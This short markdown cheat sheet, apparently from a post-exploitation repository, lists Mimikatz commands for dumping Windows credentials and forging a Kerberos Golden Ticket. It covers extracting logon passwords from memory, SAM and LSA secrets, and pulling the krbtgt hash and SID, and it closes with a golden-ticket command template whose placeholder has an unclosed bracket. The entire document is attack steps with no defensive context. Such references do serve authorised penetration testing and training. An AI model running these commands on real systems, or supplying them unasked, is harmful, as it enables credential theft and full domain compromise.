### Dump hashes

**Run mimikatz.exe**
```
.\mimikatz.exe
```

**Check privileges**
```
privilege::debug
```

**Retrieve logon passwords stored in memory on a Windows machine**
```
sekurlsa::logonpasswords
```

**Dump SAM file**
```
lsadump::sam
```

**Dump lsa secrets**
```
lsadump::lsa /patch
```
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

### Golden Ticket Attacks

**Run mimikatz.exe**
```
.\mimikatz.exe
```

**Check privileges**
```
privilege::debug
```

**Dump the hash and security identifier of the Kerberos Ticket Granting Ticket**
```
lsadump::lsa /inject /name:krbtgt
```
![image](https://github.com/dar3k93/Post-exploitation/assets/49185097/5436d205-f8c1-46ef-b909-be7512fa2946)

**Create a Golden Ticket**
```
kerberos::golden /user:<user_name> /domain:<domian_name> /sid:<from_above ouput /krbtgt:<NTLM_above output> /id:<SID for instance admin is 500>
```
